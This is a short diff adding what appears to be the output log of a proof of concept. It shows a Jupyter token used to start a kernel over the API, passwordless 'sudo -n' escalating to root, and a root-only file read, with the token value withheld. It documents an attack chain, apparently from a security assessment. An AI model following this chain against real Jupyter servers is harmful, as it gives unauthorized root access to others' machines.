@@ -1,0 +1,15 @@
+POC-1: Jupyter token -> code execution -> root
+token length: 32 (value not printed)
+GET /api: 200
+POST /api/kernels: 201
+kernel id: 755ad0b7-df6d-4cec-bf59-fd03307e3674
+connection file present: True
+--- kernel identity ---
+uid=1000 gid=1000 user=ubuntu
+--- sudo -n id ---
+uid=0(root) gid=0(root) groups=0(root)
+--- root-only read ---
+uid=0(root) gid=0(root) groups=0(root)
+<instance-host>
+root-read-ok
+DELETE /api/kernels: 204
